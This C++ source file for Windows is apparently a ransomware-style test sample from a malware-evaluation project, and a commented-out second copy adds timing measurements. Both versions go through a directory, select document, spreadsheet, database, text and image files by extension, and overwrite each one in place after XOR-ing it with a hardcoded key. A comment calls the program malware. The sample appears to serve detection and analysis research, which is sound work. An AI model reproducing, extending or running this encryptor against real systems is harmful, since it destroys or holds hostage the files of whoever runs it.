#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <Shlwapi.h> // For PathFindExtension
#include <algorithm> // Required for std::transform
#include <cctype>    // Required for ::tolower

#pragma comment(lib, "Shlwapi.lib") // Link with Shlwapi.lib

// Function to perform a simple XOR encryption/decryption
void XORCipher(char* data, DWORD size, const char* key, int keyLength) {
	for (DWORD i = 0; i < size; ++i) {
		data[i] ^= key[i % keyLength];
	}
}

// Function to encrypt a single file
void EncryptFile(const std::string& filePath, const char* encryptionKey, int keyLength) {
	HANDLE hFile = CreateFileA(
		filePath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Error opening file " << filePath << ": " << GetLastError() << std::endl;
		return;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		std::cerr << "Error getting file size for " << filePath << ": " << GetLastError() << std::endl;
		CloseHandle(hFile);
		return;
	}

	char* buffer = new char[fileSize];
	DWORD bytesRead;
	if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
		std::cerr << "Error reading file " << filePath << ": " << GetLastError() << std::endl;
		delete[] buffer;
		CloseHandle(hFile);
		return;
	}

	// Encrypt the buffer
	XORCipher(buffer, fileSize, encryptionKey, keyLength);

	// Set file pointer to the beginning to overwrite
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	DWORD bytesWritten;
	if (!WriteFile(hFile, buffer, fileSize, &bytesWritten, NULL)) {
		std::cerr << "Error writing to file " << filePath << ": " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Encrypted: " << filePath << std::endl;
	}

	delete[] buffer;
	CloseHandle(hFile);
}

// Function to enumerate and encrypt files in a directory
void EnumerateAndEncryptFiles(const std::string& directoryPath, const std::vector<std::string>& targetExtensions, const char* encryptionKey, int keyLength) {
	WIN32_FIND_DATAA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::string searchPath = directoryPath + "\\*";

	hFind = FindFirstFileA(searchPath.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "Error opening directory " << directoryPath << ": " << GetLastError() << std::endl;
		return;
	}

	do {
		// Skip current and parent directory entries
		if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
			continue;
		}

		// Construct full file path
		std::string fullPath = directoryPath + "\\" + findFileData.cFileName;

		if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			// Recursively encrypt files in subdirectories (optional, uncomment if needed)
			// EnumerateAndEncryptFiles(fullPath, targetExtensions, encryptionKey, keyLength);
		}
		else {
			// Check if the file extension matches our target extensions
			LPCSTR fileExtension = PathFindExtensionA(fullPath.c_str());
			if (fileExtension && *fileExtension) { // Ensure extension exists
				std::string ext(fileExtension);
				// Convert extension to lowercase for case-insensitive comparison
				std::transform(ext.begin(), ext.end(), ext.begin(),
					[](unsigned char c) { return std::tolower(c); }); // Fixed: using lambda and std::tolower

				for (const auto& targetExt : targetExtensions) {
					if (ext == targetExt) {
						EncryptFile(fullPath, encryptionKey, keyLength);
						break; // Found a match, move to the next file
					}
				}
			}
		}
	} while (FindNextFileA(hFind, &findFileData) != 0);

	FindClose(hFind);
}


int main()
{
	// Define the target directory for encryption
	std::string targetDirectory = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

	// Define target file extensions
	std::vector<std::string> targetExtensions = { ".docx", ".xlsx", ".db", ".txt", ".png" }; // Added .png for testing

	// Simple encryption key
	const char* encryptionKey = "MySecretKey123";
	int keyLength = strlen(encryptionKey);

	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		// Call the encryption function at the beginning of the malware's execution
		EnumerateAndEncryptFiles(targetDirectory, targetExtensions, encryptionKey, keyLength);
	}
	return 0;
}


/*
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <Shlwapi.h> // For PathFindExtension
#include <algorithm> // For std::transform
#include <cctype>    // For ::tolower
#include <chrono>    // For timing

#pragma comment(lib, "Shlwapi.lib") // Link with Shlwapi.lib

// XOR encryption/decryption
void XORCipher(char* data, DWORD size, const char* key, int keyLength) {
	for (DWORD i = 0; i < size; ++i) {
		data[i] ^= key[i % keyLength];
	}
}

// Encrypt a single file
bool EncryptFile(const std::string& filePath, const char* encryptionKey, int keyLength) {
	HANDLE hFile = CreateFileA(
		filePath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "[!] Error opening file " << filePath << ": " << GetLastError() << std::endl;
		return false;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		std::cerr << "[!] Error getting file size for " << filePath << ": " << GetLastError() << std::endl;
		CloseHandle(hFile);
		return false;
	}

	char* buffer = new char[fileSize];
	DWORD bytesRead;
	if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
		std::cerr << "[!] Error reading file " << filePath << ": " << GetLastError() << std::endl;
		delete[] buffer;
		CloseHandle(hFile);
		return false;
	}

	XORCipher(buffer, fileSize, encryptionKey, keyLength);

	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	DWORD bytesWritten;
	bool success = WriteFile(hFile, buffer, fileSize, &bytesWritten, NULL);
	if (success) {
		std::cout << "[+] Encrypted: " << filePath << std::endl;
	}
	else {
		std::cerr << "[!] Error writing to file " << filePath << ": " << GetLastError() << std::endl;
	}

	delete[] buffer;
	CloseHandle(hFile);
	return success;
}

// Enumerate files and encrypt matching extensions
void EnumerateAndEncryptFiles(const std::string& directoryPath, const std::vector<std::string>& targetExtensions, const char* encryptionKey, int keyLength) {
	WIN32_FIND_DATAA findFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::string searchPath = directoryPath + "\\*";

	hFind = FindFirstFileA(searchPath.c_str(), &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "[!] Error opening directory " << directoryPath << ": " << GetLastError() << std::endl;
		return;
	}

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do {
		if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
			continue;
		}

		std::string fullPath = directoryPath + "\\" + findFileData.cFileName;

		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			LPCSTR fileExtension = PathFindExtensionA(fullPath.c_str());
			if (fileExtension && *fileExtension) {
				std::string ext(fileExtension);
				std::transform(ext.begin(), ext.end(), ext.begin(),
					[](unsigned char c) { return std::tolower(c); });

				for (const auto& targetExt : targetExtensions) {
					if (ext == targetExt) {
						auto start = std::chrono::high_resolution_clock::now();

						bool success = EncryptFile(fullPath, encryptionKey, keyLength);

						auto end = std::chrono::high_resolution_clock::now();
						std::chrono::duration<double, std::micro> duration = end - start;

						totalMicroseconds += duration.count();
						++attemptCount;

						if (!success) {
							std::cout << "[!] Failed to encrypt (fake or real): " << fullPath << " - Time: " << duration.count() << " µs\n";
						}
						else {
							std::cout << "[*] Time taken: " << duration.count() << " µs\n";
						}
						break;
					}
				}
			}
		}

	} while (FindNextFileA(hFind, &findFileData) != 0);

	FindClose(hFind);

	if (attemptCount > 0) {
		double avgTime = totalMicroseconds / attemptCount;
		std::cout << "\n[*] Total files attempted: " << attemptCount << "\n";
		std::cout << "[*] Total time spent: " << totalMicroseconds << " µs\n";
		std::cout << "[*] Average time per attempt: " << avgTime << " µs\n\n";
	}
	else {
		std::cout << "[!] No matching files to process.\n\n";
	}
}

int main() {
	std::string targetDirectory = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

	std::vector<std::string> targetExtensions = { ".docx", ".xlsx", ".db", ".txt", ".png" };

	const char* encryptionKey = "MySecretKey123";
	int keyLength = strlen(encryptionKey);

	std::string value;
	while (true) {
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and Encrypt Files (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		std::cout << "[*] Starting file encryption...\n";
		EnumerateAndEncryptFiles(targetDirectory, targetExtensions, encryptionKey, keyLength);
	}

	return 0;
}

*/